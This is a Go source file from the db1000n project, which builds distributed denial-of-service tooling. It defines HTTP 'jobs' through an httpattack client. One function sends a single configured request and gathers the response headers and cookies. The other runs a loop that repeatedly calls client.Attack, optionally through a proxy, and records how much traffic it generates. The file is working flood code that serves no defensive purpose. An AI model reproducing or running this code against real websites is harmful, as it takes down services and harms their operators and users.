package jobs

import (
	"context"
	"log"
	"time"

	"github.com/google/uuid"
	"github.com/valyala/fasthttp"

	"github.com/Arriven/db1000n/src/httpattack"
	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/utils"
)

type httpJobConfig struct {
	BasicJobConfig

	Path    string
	Method  string
	Body    string
	Headers map[string]string
	Cookies map[string]string
	Client  map[string]interface{} // See HTTPClientConfig
}

func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	var jobConfig httpJobConfig
	if err := utils.Decode(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config: %v", err)
		return nil, err
	}

	client := httpattack.NewHttpAttackClient(jobConfig.Client, globalConfig.ProxyURL, debug)

	dataSize, resp, err := client.SendSingleRequest(
		ctx,
		jobConfig.Method,
		jobConfig.Path,
		jobConfig.Body,
		jobConfig.Headers,
		jobConfig.Cookies,
		debug,
	)

	if err == nil {
		metrics.Default.Write(metrics.ProcessedTraffic, uuid.New().String(), uint64(dataSize))
	}

	headers := make(map[string]string)
	resp.Header.VisitAll(func(key []byte, value []byte) {
		headers[string(key)] = string(value)
	})
	cookies := make(map[string]string)
	resp.Header.VisitAllCookie(func(key []byte, value []byte) {
		c := fasthttp.AcquireCookie()
		defer fasthttp.ReleaseCookie(c)

		err := c.ParseBytes(value)
		if err != nil {
			return
		}

		if expire := c.Expire(); expire != fasthttp.CookieExpireUnlimited && expire.Before(time.Now()) {
			if debug {
				log.Println("cookie from request expired:", string(key))
			}
			return
		}
		cookies[string(key)] = string(c.Value())
	})
	response := make(map[string]interface{})
	response["body"] = string(resp.Body())
	response["status_code"] = resp.StatusCode()
	response["headers"] = headers
	response["cookies"] = cookies
	result := make(map[string]interface{})
	result["response"] = response
	result["error"] = err
	return result, nil
}

func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	var jobConfig httpJobConfig
	if err := utils.Decode(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config: %v", err)
		return nil, err
	}

	client := httpattack.NewHttpAttackClient(jobConfig.Client, globalConfig.ProxyURL, debug)

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)
	processedTrafficMonitor := metrics.Default.NewWriter(metrics.ProcessedTraffic, uuid.NewString())
	go processedTrafficMonitor.Update(ctx, time.Second)

	for jobConfig.Next(ctx) {

		dataSize, err := client.Attack(
			ctx,
			jobConfig.Method,
			jobConfig.Path,
			jobConfig.Body,
			jobConfig.Headers,
			jobConfig.Cookies,
			debug,
		)

		if dataSize != -1 {
			trafficMonitor.Add(uint64(dataSize))
		}

		if err == nil {
			processedTrafficMonitor.Add(uint64(dataSize))
		}
	}

	return nil, nil
}
